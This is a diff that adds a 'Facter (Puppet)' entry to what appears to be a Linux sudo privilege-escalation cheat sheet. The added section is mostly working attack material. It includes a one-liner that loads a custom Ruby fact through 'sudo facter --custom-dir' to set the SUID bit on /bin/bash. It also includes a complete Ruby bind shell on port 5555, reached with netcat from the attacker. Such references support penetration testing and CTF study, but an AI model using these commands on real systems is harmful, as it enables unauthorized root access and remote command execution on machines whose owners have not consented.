@@ -519,6 +519,45 @@ sudo /usr/bin/find . -exec /bin/bash \; -quit
 sudo /find /bin -name nano -exec /bin/sh \;
 ```
 
+### Facter (Puppet)
+
+If you can run `sudo /usr/bin/facter` (e.g. `(ALL) NOPASSWD: /usr/bin/facter`), use `--custom-dir` to load a directory containing Ruby code; Facter will execute custom facts as root. Write a Ruby script that runs a shell or bind shell, then point facter at its directory.
+
+**One-liner (exec shell):**
+
+```bash
+echo 'exec "chmod +s /bin/bash"' > /tmp/shell.rb
+chmod +x /tmp/shell.rb
+sudo /usr/bin/facter --custom-dir=/tmp shell.rb x
+```
+
+**Bind shell (Ruby, listen on 5555):** Save as `/tmp/s.rb`, then `sudo /usr/bin/facter --custom-dir=/tmp s.rb`. From attacker: `echo "id" | nc TARGET 5555`.
+
+```ruby
+#!/usr/bin/env ruby
+require 'socket'
+require 'open3'
+Socket.tcp_server_loop(5555) do |sock, client_addrinfo|
+  begin
+    while command = sock.gets
+      Open3.popen2e("#{command}") do |stdin, stdout_and_stderr|
+        IO.copy_stream(stdout_and_stderr, sock)
+      end
+    end
+  rescue
+    break if command =~ /IQuit!/
+    sock.write "Command or file not found.\n"
+    retry
+  ensure
+    sock.close
+  end
+end
+```
+
+**References:**
+* https://gtfobins.github.io/gtfobins/facter/
+* https://github.com/secjohn/ruby-shells/blob/master/revshell.rb (Ruby reverse/bind shells)
+
 ### nano
 
 ```
